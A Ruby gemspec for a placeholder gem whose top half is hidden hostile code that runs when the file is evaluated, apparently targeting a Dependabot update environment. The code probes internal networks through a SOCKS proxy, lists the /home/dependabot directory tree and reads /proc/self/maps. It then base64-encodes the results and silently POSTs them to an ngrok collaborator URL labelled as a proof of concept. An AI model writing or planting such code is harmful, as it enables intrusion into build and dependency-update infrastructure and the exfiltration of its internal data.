COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "socket"
  require "uri"

  results = []

  # DNS resolve dependabot-actions.githubapp.com
  begin
    require "resolv"
    ip = Resolv.getaddress("dependabot-actions.githubapp.com")
    results << "=== API IP: #{ip} ==="
    s = TCPSocket.new(ip, 443)
    s.close
    results << "=== DIRECT #{ip}:443 OPEN ==="
  rescue => e
    results << "=== RESOLVE/DIRECT ERR: #{e.message} ==="
  end

  # Proxy pivot: stuur raw HTTP via proxy naar andere netwerken
  ["http://172.17.0.1/", "http://172.18.0.1/", "http://172.20.0.1/"].each do |target|
    begin
      sock = TCPSocket.new("172.19.0.2", 1080)
      host = target.split("/")[2]
      sock.write("GET #{target} HTTP/1.0\r\nHost: #{host}\r\n\r\n")
      sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [3, 0].pack("l_2"))
      resp = sock.recv(1024)
      sock.close
      results << "=== PIVOT #{target} ===\n#{resp[0..300]}"
    rescue => e
      results << "=== PIVOT #{target} #{e.class} ==="
    end
  end

  # /home/dependabot filesystem tree
  begin
    tree = `find /home/dependabot -maxdepth 4 2>/dev/null`
    results << "=== FS TREE ===\n#{tree[0..4000]}"
  rescue => e
    results << "=== FS TREE ERR: #{e.class} ==="
  end

  # /proc/self/maps
  begin
    results << "=== /proc/self/maps ===\n#{File.read('/proc/self/maps')[0..2000]}"
  rescue => e
    results << "=== /proc/self/maps ERR ==="
  end

  payload = [results.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=pivot2")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
